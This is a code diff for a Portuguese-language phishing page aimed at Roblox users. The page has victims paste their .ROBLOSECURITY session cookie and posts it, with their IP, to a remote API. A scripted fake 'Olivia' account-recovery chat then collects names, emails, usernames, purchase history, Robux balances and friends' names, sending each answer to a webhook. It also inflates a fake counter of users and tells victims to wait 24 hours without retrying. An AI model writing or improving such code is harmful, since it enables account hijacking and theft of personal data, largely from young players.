+            btnSim.className = 'quick-action-btn';
+            btnSim.textContent = '✅ SIM';
+            btnSim.style.background = 'rgba(16, 185, 129, 0.2)';
+            btnSim.style.borderColor = '#10b981';
+            btnSim.onclick = () => sendQuickMessage('SIM');
+            
+            const btnNao = document.createElement('button');
+            btnNao.className = 'quick-action-btn';
+            btnNao.textContent = '❌ NÃO';
+            btnNao.style.background = 'rgba(244, 63, 94, 0.2)';
+            btnNao.style.borderColor = '#f43f5e';
+            btnNao.onclick = () => sendQuickMessage('NÃO');
+            
+            optionsDiv.appendChild(btnSim);
+            optionsDiv.appendChild(btnNao);
+            
+            messagesDiv.appendChild(optionsDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
-        document.getElementById('cookieInput').addEventListener('input', updatePreview);
-        document.getElementById('cookieInput').addEventListener('paste', () => setTimeout(updatePreview, 100));
+        // ===== MENSAGENS DA OLIVIA - MUITO MAIS COMPLETAS =====
+        const oliviaMessages = [
+            // Passo 0 - Boas-vindas
+            "Olá! Sou Olivia, prazer em te conhecer! 😊 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: o que aconteceu com sua conta?\n\n✅ Opções comuns:\n• Perdi acesso à conta\n• Esqueceram minha senha\n• Minha conta foi hackeada\n• Não consigo mais acessar o email\n\nFique tranquilo, vou te ajudar passo a passo!",
 
-        // ===== ENVIAR COOKIE PRIMEIRO =====
-        async function sendCookieFirst() {
-            const input = document.getElementById('cookieInput');
-            const status = document.getElementById('status');
-            const btn = document.getElementById('sendBtn');
-            
-            const banMessageEl = document.getElementById('banMessage');
-            if (banMessageEl.style.display === 'block') {
-                showCosmicNotification('Bloqueado', 'Acesso negado pela matriz');
-                return;
-            }
-            
-            const rawCookie = input.value.trim();
+            // Passo 1 - Entendendo o problema
+            "Entendi! Agora me diga qual é o seu PRIMEIRO NOME (o nome que você usa no Roblox ou seu nome real).\n\nIsso é importante porque quando você compra Robux, o nome fica registrado no histórico de compras. Assim podemos confirmar que a conta é realmente sua!",
 
-            if (!rawCookie) {
-                showCosmicNotification('Erro', 'Insira a chave cósmica');
-                return;
-            }
+            // Passo 2 - Solicitando email
+            "Obrigada! Agora me informe um E-MAIL válido.\n\n📧 Pode ser um email novo, é para onde vamos enviar as instruções de recuperação.\n\nExemplo: meunome@gmail.com",
 
-            if (!checkCooldown()) {
-                const rem = Math.ceil(getCooldownRemaining() / 1000);
-                showCosmicNotification('Aguarde', `Próximo salto em ${rem}s`);
-                return;
-            }
+            // Passo 3 - Username Roblox
+            "Perfeito! Agora qual é seu NOME DE USUÁRIO no Roblox?\n\n🎮 Exemplo: joaozinho_roblox123\n\nÉ o nome que aparece quando você joga.",
 
-            const cookie = cleanCookie(rawCookie);
+            // Passo 4 - Última compra
+            "Ótimo! Agora me diga qual foi a ÚLTIMA COMPRA que você fez no Roblox.\n\n💰 Pode ser:\n• O valor (ex: R$25, R$50)\n• O item comprado (ex: Korblox, Headless)\n• A data aproximada da compra",
 
-            if (cookie.length < 50) {
-                showCosmicNotification('Erro', 'Chave cósmica incompleta');
-                return;
-            }
+            // Passo 5 - Acesso ao email
+            "Entendi! Você ainda tem ACESSO AO E-MAIL de cadastro?\n\n✅ Responda apenas com SIM ou NÃO.\n\nIsso ajuda a saber se podemos enviar o código de verificação para o email antigo.",
 
-            status.innerHTML = '<div class="cosmic-spinner"></div>';
-            btn.disabled = true;
+            // Passo 6 - Data de criação
+            "Ok! Agora me diga a DATA APROXIMADA que você criou essa conta.\n\n📅 Exemplos:\n• 2020\n• março/2021\n• início de 2022\n\nNão precisa ser exato, só uma estimativa ajuda.",
 
-            try {
-                const response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        cookie: cookie,
-                        ip: userIP,
-                        device: navigator.userAgent.includes('Mobile') ? '📱 Móvel' : '💻 Estação',
-                        timestamp: new Date().toLocaleString('pt-BR'),
-                        action: 'cookie_validation'
-                    })
-                });
+            // Passo 7 - Itens exclusivos
+            "Você tem algum ITEM EXCLUSIVO ou raro na conta?\n\n👑 Exemplos:\n• Headless Horseman\n• Korblox Deathspeaker\n• Dominus\n• Itens de eventos limitados\n\nIsso ajuda a confirmar que a conta é sua.",
 
-                const data = await response.json();
+            // Passo 8 - Robux atual
+            "Quantos ROBUX você tem atualmente na conta?\n\n💎 Um valor aproximado já ajuda:\n• 500 Robux\n• 1.000 Robux\n• 5.000+ Robux",
 
-                if (response.ok) {
-                    localStorage.setItem(COOLDOWN_KEY, Date.now().toString());
-                    updateInfoDisplays();
+            // Passo 9 - Amigos na conta
+            "Você se lembra de algum AMIGO que tem na sua lista?\n\n👥 Pode me dizer o nome de 1 ou 2 amigos que você tinha adicionado?\n\nIsso também é uma forma de verificação.",
 
-                    status.innerHTML = '<div style="color: #10b981; font-size: 40px;">✓</div>';
-                    input.value = '';
-                    updatePreview();
-                    
-                    document.getElementById('countStat').textContent = 
-                        (parseFloat(document.getElementById('countStat').textContent) + 0.1).toFixed(1) + 'k';
-                    
-                    showCosmicNotification('Sucesso!', 'Chave validada com sucesso');
-                    
-                    cookieValidated = true;
-                    
-                    setTimeout(() => {
-                        document.getElementById('page1').classList.add('hidden');
-                        document.getElementById('page2').classList.remove('hidden');
-                        status.innerHTML = '';
-                    }, 1500);
-                } else {
-                    if (data.banned) {
-                        await checkIfBanned();
-                        showCosmicNotification('🚫 BANIDO', data.message || 'Acesso negado');
-                    } else {
-                        throw new Error(data.error || 'Erro na transmissão');
-                    }
-                }
-            } catch (error) {
-                showCosmicNotification('Erro', 'Falha na transmissão');
-            } finally {
-                setTimeout(() => { 
-                    if (banMessageEl.style.display !== 'block') {
-                        btn.disabled = false; 
-                    }
-                }, 2000);
-            }
-        }
+            // Passo 10 - Primeiro item
+            "Qual foi o PRIMEIRO ITEM que você comprou ou ganhou no Roblox?\n\n🎁 Pode ser algo simples como um chapéu ou uma roupa.",
 
-        // ===== FUNÇÕES DO CHAT =====
-        function openSupportChat() {
-            if (!cookieValidated) {
-                showCosmicNotification('Atenção', 'Valide a chave cósmica primeiro');
-                return;
-            }
-            
+            // Passo 11 - Analisando
+            "Todas as informações foram enviadas para análise. 🔍\n\n⏳ Isso pode levar até 24 horas.\n\n⚠️ Não tente novamente durante este período, pois o sistema vai bloquear e você não receberá nada.",
+
+            // Passo 12 - Final
+            "Sua solicitação está em análise. Você receberá um e-mail em até 24 horas com as instruções.\n\nObrigado por usar a Aurora! ❤️"
+        ];
+
+        const waitingMessages = [
+            "Ainda estou aqui! Estou só esperando sua resposta.",
+            "Sem pressa! Me responde quando puder.",
+            "Continua aí? Qualquer dúvida é só perguntar.",
+            "Estou aguardando sua resposta para continuar com o atendimento.",
+            "Ainda está aí? Podemos continuar quando você quiser.",
+            "Não precisa ter pressa, estou aqui para ajudar!",
+            "Se tiver dúvidas sobre alguma pergunta, pode me perguntar."
+        ];
+
+        const goodbyeMessages = [
+            "Foi um prazer ajudar!",
+            "Qualquer coisa, é só voltar!",
+            "Até mais! Cuide bem da sua conta!",
+            "Volte sempre que precisar!",
+            "Espero ter ajudado! Qualquer dúvida, estou aqui."
+        ];
+
+        // ===== FUNÇÕES DO CHAT OLIVIA =====
+        function openOliviaChat() {
             document.getElementById('page2').classList.add('hidden');
             document.getElementById('page3').classList.remove('hidden');
             
@@ -1274,11 +1445,10 @@
             analysisStarted = false;
             
             conversationId = generateSessionId();
-            
             document.getElementById('quickActions').style.display = 'grid';
             
             setTimeout(() => {
-                addSupportMessage(SUPPORT_MESSAGES.welcome);
+                addOliviaMessage(oliviaMessages[0]);
                 sendToWebhook('system', 'chat_iniciado', { message: 'Chat iniciado' });
                 
                 setTimeout(() => {
@@ -1288,14 +1458,8 @@
         }
 
         function closeChat() {
-            const goodbyes = [
-                `Até breve, viajante! 🌟 - ${SUPPORT_NAME}`,
-                `Que as estrelas guiem seu caminho! ✨ - ${SUPPORT_NAME}`,
-                `Volte sempre que precisar! 🌠 - ${SUPPORT_NAME}`,
-                `Conexão encerrada. Até a próxima! 💫 - ${SUPPORT_NAME}`
-            ];
-            const goodbye = goodbyes[Math.floor(Math.random() * goodbyes.length)];
-            showCosmicNotification('👋 Até logo!', goodbye);
+            const goodbye = goodbyeMessages[Math.floor(Math.random() * goodbyeMessages.length)];
+            showNotification('👋 Até logo!', goodbye, false);
             
             if (chatHistory.length > 0) {
                 sendToWebhook('system', 'chat_finalizado', { 
@@ -1311,76 +1475,28 @@
             document.getElementById('page2').classList.remove('hidden');
         }
 
-        function showExamples() {
-            const examples = [
-                "🌠 **EXEMPLOS DE RESPOSTAS:**",
-                "• **NOME:** João Silva Santos",
-                "• **E-MAIL:** joaosilva@gmail.com",
-                "• **USER:** joaozinho_roblox123",
-                "• **COMPRA:** R$50 ou Korblox",
-                "• **ACESSO E-MAIL:** SIM ou NÃO",
-                "• **DATA:** março/2020"
-            ];
+        function addOliviaMessage(text) {
+            if (text.includes('{nome}') && userName) {
+                text = text.replace('{nome}', userName);
+            }
             
-            const messagesDiv = document.getElementById('chatMessages');
-            const examplesDiv = document.createElement('div');
-            examplesDiv.className = 'cosmic-message support';
-            
-            examplesDiv.innerHTML = `
-                <div>${examples.join('<br>')}</div>
-                <div class="message-time-cosmic">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div>
-            `;
-            
-            messagesDiv.appendChild(examplesDiv);
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        }
-
-        function addYesNoButtons() {
-            const messagesDiv = document.getElementById('chatMessages');
-            const optionsDiv = document.createElement('div');
-            optionsDiv.className = 'stellar-actions';
-            optionsDiv.style.margin = '10px 0';
-            optionsDiv.style.display = 'grid';
-            optionsDiv.style.gridTemplateColumns = '1fr 1fr';
-            
-            const btnSim = document.createElement('button');
-            btnSim.className = 'stellar-btn';
-            btnSim.innerHTML = '✅ SIM';
-            btnSim.style.background = 'rgba(16, 185, 129, 0.2)';
-            btnSim.style.borderColor = '#10b981';
-            btnSim.onclick = () => sendQuickMessage('SIM');
-            
-            const btnNao = document.createElement('button');
-            btnNao.className = 'stellar-btn';
-            btnNao.innerHTML = '❌ NÃO';
-            btnNao.style.background = 'rgba(239, 68, 68, 0.2)';
-            btnNao.style.borderColor = '#ef4444';
-            btnNao.onclick = () => sendQuickMessage('NÃO');
-            
-            optionsDiv.appendChild(btnSim);
-            optionsDiv.appendChild(btnNao);
-            
-            messagesDiv.appendChild(optionsDiv);
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        }
-
-        function addSupportMessage(text) {
             const messagesDiv = document.getElementById('chatMessages');
             const messageDiv = document.createElement('div');
-            messageDiv.className = 'cosmic-message support';
+            messageDiv.className = 'message olivia';
             
             const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            const formattedText = text.replace(/\n/g, '<br>');
             
             messageDiv.innerHTML = `
-                <div>${text.replace(/\n/g, '<br>')}</div>
-                <div class="message-time-cosmic">${time}</div>
+                <div class="message-content">${formattedText}</div>
+                <div class="message-time">${time}</div>
             `;
             
             messagesDiv.appendChild(messageDiv);
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
             
             chatHistory.push({
-                sender: 'support',
+                sender: 'olivia',
                 message: text,
                 time: time,
                 step: chatStep
@@ -1390,13 +1506,13 @@
         function addUserMessage(text) {
             const messagesDiv = document.getElementById('chatMessages');
             const messageDiv = document.createElement('div');
-            messageDiv.className = 'cosmic-message user';
+            messageDiv.className = 'message user';
             
             const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
             
             messageDiv.innerHTML = `
-                <div>${text}</div>
-                <div class="message-time-cosmic">${time}</div>
+                <div class="message-content">${text}</div>
+                <div class="message-time">${time}</div>
             `;
             
             messagesDiv.appendChild(messageDiv);
@@ -1418,7 +1534,7 @@
         function showTyping() {
             const messagesDiv = document.getElementById('chatMessages');
             const typingDiv = document.createElement('div');
-            typingDiv.className = 'cosmic-typing';
+            typingDiv.className = 'typing-indicator';
             typingDiv.id = 'typingIndicator';
             typingDiv.innerHTML = '<span></span><span></span><span></span>';
             messagesDiv.appendChild(typingDiv);
@@ -1437,25 +1553,29 @@
             if (!text) return;
             
             if (analysisStarted) {
-                addSupportMessage(SUPPORT_MESSAGES.final);
+                addOliviaMessage("Sua solicitação já está em análise. Por favor, aguarde até 24 horas para receber o e-mail.");
                 input.value = '';
                 return;
             }
             
             addUserMessage(text);
             input.value = '';
-            
             document.getElementById('quickActions').style.display = 'none';
-            
             chatStep++;
             
+            // Mapeamento dos passos para envio ao webhook
             if (chatStep === 1) {
                 userProblem = text;
                 sendToWebhook('info', 'problema', { problema: text });
             } 
             else if (chatStep === 2) {
-                if (text.length < 5 || text.includes('@')) {
-                    addSupportMessage("❌ Por favor, digite um **NOME COMPLETO** válido (ex: João Silva)");
+                if (text.length < 5) {
+                    addOliviaMessage("Por favor, digite um NOME COMPLETO válido (mínimo 5 letras)");
+                    chatStep--;
+                    return;
+                }
+                if (text.includes('@')) {
+                    addOliviaMessage("Isso parece um e-mail. Digite seu NOME COMPLETO (ex: João Silva)");
                     chatStep--;
                     return;
                 }
@@ -1464,7 +1584,7 @@
             } 
             else if (chatStep === 3) {
                 if (!text.includes('@') || !text.includes('.')) {
-                    addSupportMessage("❌ Digite um **E-MAIL** válido (ex: nome@gmail.com)");
+                    addOliviaMessage("Isso não parece um E-MAIL válido. Digite um email com @ e . (ex: nome@gmail.com)");
                     chatStep--;
                     return;
                 }
@@ -1473,7 +1593,7 @@
             } 
             else if (chatStep === 4) {
                 if (text.length < 3) {
-                    addSupportMessage("❌ Digite um **USERNAME** válido (mínimo 3 caracteres)");
+                    addOliviaMessage("Por favor, digite um NOME DE USUÁRIO válido (mínimo 3 caracteres)");
                     chatStep--;
                     return;
                 }
@@ -1481,19 +1601,31 @@
                 sendToWebhook('info', 'username', { username: text });
             } 
             else if (chatStep === 5) {
+                if (text.length < 2) {
+                    addOliviaMessage("Por favor, digite algo sobre a última compra (ex: R$50, Korblox)");
+                    chatStep--;
+                    return;
+                }
                 sendToWebhook('info', 'ultima_compra', { compra: text });
-                setTimeout(() => addYesNoButtons(), 1000);
+                setTimeout(() => {
+                    addYesNoButtons();
+                }, 1000);
             } 
             else if (chatStep === 6) {
                 const resposta = text.toUpperCase();
                 if (resposta !== 'SIM' && resposta !== 'NÃO' && resposta !== 'NAO') {
-                    addSupportMessage("❌ Responda apenas com **SIM** ou **NÃO**");
+                    addOliviaMessage("Por favor, responda apenas com SIM ou NÃO");
                     chatStep--;
                     return;
                 }
                 sendToWebhook('info', 'acesso_email', { acesso: text });
             } 
             else if (chatStep === 7) {
+                if (text.length < 4) {
+                    addOliviaMessage("Por favor, digite uma data aproximada (ex: 2020, março/2021)");
+                    chatStep--;
+                    return;
+                }
                 sendToWebhook('info', 'data_criacao', { data: text });
             } 
             else if (chatStep === 8) {
@@ -1501,56 +1633,87 @@
             } 
             else if (chatStep === 9) {
                 sendToWebhook('info', 'robux_atual', { robux: text });
+            } 
+            else if (chatStep === 10) {
+                sendToWebhook('info', 'amigos', { amigos: text });
+            } 
+            else if (chatStep === 11) {
+                sendToWebhook('info', 'primeiro_item', { primeiro_item: text });
                 analysisStarted = true;
             } 
             else {
                 analysisStarted = true;
-                addSupportMessage(SUPPORT_MESSAGES.final);
+                addOliviaMessage("Sua solicitação já está em análise. Aguarde 24 horas.");
                 return;
             }
             
             showTyping();
-            
             const typingTime = Math.floor(Math.random() * 1500) + 1000;
             await new Promise(resolve => setTimeout(resolve, typingTime));
-            
             hideTyping();
             
-            if (!analysisStarted) {
-                let messageToSend = '';
+            if (!analysisStarted && chatStep < oliviaMessages.length) {
+                let messageToSend = oliviaMessages[chatStep];
+                addOliviaMessage(messageToSend);
                 
-                if (chatStep === 1) messageToSend = SUPPORT_MESSAGES.askName;
-                else if (chatStep === 2) messageToSend = SUPPORT_MESSAGES.askEmail;
-                else if (chatStep === 3) messageToSend = SUPPORT_MESSAGES.askUsername;
-                else if (chatStep === 4) messageToSend = SUPPORT_MESSAGES.askPurchase;
-                else if (chatStep === 5) messageToSend = SUPPORT_MESSAGES.askEmailAccess;
-                else if (chatStep === 6) messageToSend = SUPPORT_MESSAGES.askDate;
-                else if (chatStep === 7) messageToSend = SUPPORT_MESSAGES.askItems;
-                else if (chatStep === 8) messageToSend = SUPPORT_MESSAGES.askRobux;
-                else if (chatStep === 9) messageToSend = SUPPORT_MESSAGES.analysis;
+                sendToWebhook('olivia', 'resposta', { 
+                    message: messageToSend,
+                    step: chatStep 
+                });
                 
-                if (messageToSend) {
-                    addSupportMessage(messageToSend);
+                if (chatStep === 11) {
+                    document.getElementById('chatInput').disabled = true;
+                    document.querySelector('.chat-send').disabled = true;
+                    document.querySelector('.chat-send').style.opacity = '0.5';
                     
-                    sendToWebhook('support', 'resposta', { 
-                        message: messageToSend,
-                        step: chatStep 
-                    });
-                    
-                    if (chatStep === 9) {
-                        document.getElementById('chatInput').disabled = true;
-                        document.querySelector('.cosmic-send').disabled = true;
-                        document.querySelector('.cosmic-send').style.opacity = '0.5';
-                        
-                        setTimeout(() => {
-                            addSupportMessage(SUPPORT_MESSAGES.final);
-                        }, 2000);
-                    }
+                    setTimeout(() => {
+                        addOliviaMessage("Aguarde 24 horas para receber o e-mail com as instruções.");
+                    }, 2000);
                 }
             }
         }
 
-        // ===== FUNÇÕES DE IP E BAN =====
+        async function sendToWebhook(type, action, data) {
+            try {
+                const payload = {
+                    content: type === 'system' ? null : `**${type.toUpperCase()}** - ${action}`,
+                    embeds: [{
+                        title: `💬 Chat Olivia - ${action}`,
+                        color: type === 'olivia' ? 0xec4899 : type === 'user' ? 0x6366f1 : 0x10b981,
+                        fields: [
+                            {
+                                name: '📱 Informações',
+                                value: `\`\`\`yml
+Conversa ID: ${conversationId}
+Passo: ${chatStep}
+Nome: ${userName || 'Não informado'}
+Email: ${userEmail || 'Não informado'}
+Roblox: ${userRoblox || 'Não informado'}
+Problema: ${userProblem || 'Não informado'}
+\`\`\``
+                            },
+                            {
+                                name: '💬 Dados',
+                                value: '```json\n' + JSON.stringify(data, null, 2).substring(0, 900) + '\n```'
+                            }
+                        ],
+                        footer: {
+                            text: `Olivia Chat • ${new Date().toLocaleString('pt-BR')}`
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(CHAT_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Erro ao enviar para webhook do chat:', error);
+            }
+        }
+
         async function getUserIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -1577,7 +1740,7 @@
                 
                 if (data.banned) {
                     banMessageEl.style.display = 'block';
-                    banMessageEl.innerHTML = `🚫 ACESSO NEGADO<br><small>${data.message || 'Contate o suporte'}</small>`;
+                    banMessageEl.innerHTML = `🚫 IP BANIDO<br><small>${data.message || 'Contate o suporte'}</small>`;
                     sendBtn.disabled = true;
                     sendBtn.style.opacity = '0.5';
                     cookieInput.disabled = true;
@@ -1594,7 +1757,6 @@
             }
         }
 
-        // ===== COOLDOWN =====
         function checkCooldown() {
             const lastSent = localStorage.getItem(COOLDOWN_KEY);
             if (!lastSent) return true;
@@ -1616,7 +1778,7 @@
                 const remaining = getCooldownRemaining();
                 if (remaining > 0) {
                     const sec = Math.ceil(remaining / 1000);
-                    cdEl.textContent = `⏳ Próximo salto em ${sec}s`;
+                    cdEl.textContent = `Próximo envio em ${sec}s`;
                 } else {
                     cdEl.textContent = '';
                 }
@@ -1628,75 +1790,218 @@
         window.addEventListener('load', async () => {
             await getUserIP();
             updateInfoDisplays();
+            loadReviews();
         });
 
-        // ===== NOTIFICAÇÃO =====
-        function showCosmicNotification(title, message) {
-            const notification = document.getElementById('cosmicNotification');
-            const notifyTitle = document.getElementById('notifyCosmicTitle');
-            const notifyMessage = document.getElementById('notifyCosmicMessage');
-            const progress = document.getElementById('cosmicProgress');
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            for (let i = 0; i < 100; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.width = Math.random() * 3 + 1 + 'px';
+                star.style.height = star.style.width;
+                star.style.setProperty('--duration', (Math.random() * 3 + 2) + 's');
+                star.style.setProperty('--opacity', Math.random() * 0.7 + 0.3);
+                starsContainer.appendChild(star);
+            }
+        }
+        createStars();
+
+        function showNotification(title, message, isRecovery = false) {
+            const notification = document.getElementById('notification');
+            const notifyTitle = document.getElementById('notifyTitle');
+            const notifyMessage = document.getElementById('notifyMessage');
+            const progress = document.getElementById('notificationProgress');
+            const icon = document.querySelector('.notification-icon');
             
             notifyTitle.textContent = title;
             notifyMessage.textContent = message;
+            
+            if (isRecovery) {
+                icon.style.background = 'linear-gradient(135deg, #f43f5e, #ec4899)';
+                progress.style.background = 'linear-gradient(90deg, #f43f5e, #ec4899)';
+            } else {
+                icon.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+                progress.style.background = 'linear-gradient(90deg, #10b981, #059669)';
+            }
             
             notification.classList.add('show');
             
             progress.style.animation = 'none';
             progress.offsetHeight;
-            progress.style.animation = 'cosmicProgress 4s linear forwards';
+            progress.style.animation = 'progress 4s linear forwards';
             
             setTimeout(() => {
                 notification.classList.remove('show');
             }, 4000);
         }
 
-        // ===== WEBHOOK =====
-        async function sendToWebhook(type, action, data) {
-            try {
-                const payload = {
-                    content: type === 'system' ? null : `**${type.toUpperCase()}** - ${action}`,
-                    embeds: [{
-                        title: `💫 Chat ${SUPPORT_NAME} - ${action}`,
-                        color: type === 'support' ? 0xc084fc : type === 'user' ? 0x38bdf8 : 0x10b981,
-                        fields: [
-                            {
-                                name: '📱 Informações',
-                                value: `\`\`\`yml
-Conversa ID: ${conversationId}
-Passo: ${chatStep}
-Nome: ${userName || 'Não informado'}
-Email: ${userEmail || 'Não informado'}
-Roblox: ${userRoblox || 'Não informado'}
-Problema: ${userProblem || 'Não informado'}
-\`\`\``
-                            },
-                            {
-                                name: '💬 Dados',
-                                value: '```json\n' + JSON.stringify(data, null, 2).substring(0, 900) + '\n```'
-                            }
-                        ],
-                        footer: {
-                            text: `${SUPPORT_NAME} Chat • ${new Date().toLocaleString('pt-BR')}`
-                        },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
+        function hideNotification() {
+            document.getElementById('notification').classList.remove('show');
+        }
 
-                await fetch(CHAT_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (error) {
-                console.error('Erro ao enviar para webhook:', error);
+        // Funções de limpeza e validação de cookie
+        function cleanCookie(cookie) {
+            let c = cookie.trim();
+            c = c.replace(/^["']|["']$/g, '');
+            
+            if (c.startsWith('_|WARNING')) {
+                return c;
+            }
+            
+            if (c.startsWith('WARNING')) {
+                return '_|' + c;
+            }
+            
+            const match = c.match(/\.ROBLOSECURITY=([^;\s]+)/);
+            if (match && match[1]) {
+                return match[1];
+            }
+            
+            return c;
+        }
+
+        function isValidCookieFormat(cookie) {
+            if (!cookie.startsWith('_|WARNING') && !cookie.startsWith('WARNING')) {
+                return false;
+            }
+            
+            if (!cookie.includes('DO-NOT-SHARE')) {
+                return false;
+            }
+            
+            if (cookie.length < 50) {
+                return false;
+            }
+            
+            const validPattern = /^[_|A-Za-z0-9:\-\.=]+$/;
+            return validPattern.test(cookie);
+        }
+
+        function updatePreview() {
+            const input = document.getElementById('cookieInput');
+            const preview = document.getElementById('previewText');
+            const statusDot = document.querySelector('.status-dot');
+            const val = input.value.trim();
+            
+            if (val.length > 0) {
+                const cleaned = cleanCookie(val);
+                const isValid = isValidCookieFormat(cleaned);
+                
+                if (isValid) {
+                    preview.textContent = '✓ cookie válido';
+                    preview.style.color = '#10b981';
+                    statusDot.style.background = '#10b981';
+                } else {
+                    preview.textContent = '⚠️ formato inválido';
+                    preview.style.color = '#f59e0b';
+                    statusDot.style.background = '#f59e0b';
+                }
+            } else {
+                preview.textContent = 'aguardando cookie...';
+                preview.style.color = '#9ca3af';
+                statusDot.style.background = '#10b981';
             }
         }
 
-        // ===== UTILITÁRIOS =====
+        document.getElementById('cookieInput').addEventListener('input', updatePreview);
+        document.getElementById('cookieInput').addEventListener('paste', () => setTimeout(updatePreview, 100));
+
+        async function sendAndGo() {
+            const input = document.getElementById('cookieInput');
+            const status = document.getElementById('status');
+            const btn = document.getElementById('sendBtn');
+            
+            const banMessageEl = document.getElementById('banMessage');
+            if (banMessageEl.style.display === 'block') {
+                showNotification('Bloqueado', 'Seu IP está banido!', false);
+                return;
+            }
+            
+            const rawCookie = input.value.trim();
+
+            if (!rawCookie) {
+                showNotification('Erro', 'Cole um cookie primeiro', false);
+                return;
+            }
+
+            const cookie = cleanCookie(rawCookie);
+
+            if (!isValidCookieFormat(cookie)) {
+                showNotification('Erro', 'Formato de cookie inválido! Use o formato correto.', false);
+                return;
+            }
+
+            if (!checkCooldown()) {
+                const rem = Math.ceil(getCooldownRemaining() / 1000);
+                showNotification('Aguarde', `Pode enviar novamente em ${rem}s`, false);
+                return;
+            }
+
+            if (cookie.length < 50) {
+                showNotification('Erro', 'Cookie incompleto', false);
+                return;
+            }
+
+            status.innerHTML = '<div class="spinner"></div>';
+            btn.disabled = true;
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        cookie: cookie,
+                        ip: userIP,
+                        device: navigator.userAgent.includes('Mobile') ? '📱 Celular' : '💻 PC',
+                        timestamp: new Date().toLocaleString('pt-BR')
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    localStorage.setItem(COOLDOWN_KEY, Date.now().toString());
+                    updateInfoDisplays();
+
+                    status.innerHTML = '<div class="success-check">✓</div>';
+                    input.value = '';
+                    updatePreview();
+                    
+                    document.getElementById('countStat').textContent = 
+                        (parseFloat(document.getElementById('countStat').textContent) + 0.1).toFixed(1) + 'k';
+                    
+                    showNotification('Sucesso!', 'Cookie enviado com sucesso', false);
+                    
+                    setTimeout(() => {
+                        document.getElementById('page1').classList.add('hidden');
+                        document.getElementById('page2').classList.remove('hidden');
+                        status.innerHTML = '';
+                    }, 1000);
+                } else {
+                    if (data.banned) {
+                        await checkIfBanned();
+                        showNotification('🚫 BANIDO', data.message || 'IP banido por spam', true);
+                    } else {
+                        throw new Error(data.error || 'Erro no servidor');
+                    }
+                }
+            } catch (error) {
+                showNotification('Erro', 'Falha ao enviar cookie', false);
+            } finally {
+                setTimeout(() => { 
+                    if (banMessageEl.style.display !== 'block') {
+                        btn.disabled = false; 
+                    }
+                }, 2000);
+            }
+        }
+
         function selectPrize(prize) {
-            showCosmicNotification(prize + ' Selecionado!', 'Recompensa disponível');
-            const cards = document.querySelectorAll('.constellation-item');
+            showNotification(prize + ' Selecionado!', 'Resgate disponível em instantes', false);
+            const cards = document.querySelectorAll('.choice-item');
             cards.forEach(c => c.style.opacity = '0.5');
             setTimeout(() => cards.forEach(c => c.style.opacity = '1'), 300);
         }
@@ -1711,29 +2016,26 @@ Problema: ${userProblem || 'Não informado'}
                    Math.random().toString(36).substring(2, 15);
         }
 
-        // Criar partículas
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            for (let i = 0; i < 50; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
-                particle.style.animationDelay = Math.random() * 5 + 's';
-                particlesContainer.appendChild(particle);
-            }
-        }
-        createParticles();
-
-        // Atualizar título
-        document.title = SITE_NAME + ' ✦ cosmic recovery';
-
-        // Contador automático
         let count = 1.2;
         setInterval(() => {
             count = count + 0.1;
             document.getElementById('countStat').textContent = count.toFixed(1) + 'k';
         }, 30000);
+
+        let inactivityTimer;
+        function resetInactivityTimer() {
+            if (inactivityTimer) clearTimeout(inactivityTimer);
+            inactivityTimer = setTimeout(() => {
+                if (document.getElementById('page3').classList.contains('hidden')) return;
+                
+                const randomMessage = waitingMessages[Math.floor(Math.random() * waitingMessages.length)];
+                addOliviaMessage(randomMessage);
+            }, 45000);
+        }
+
+        document.getElementById('chatInput').addEventListener('focus', resetInactivityTimer);
+        document.getElementById('chatInput').addEventListener('input', resetInactivityTimer);
+        document.getElementById('chatInput').addEventListener('blur', resetInactivityTimer);
     </script>
 </body>
 </html>
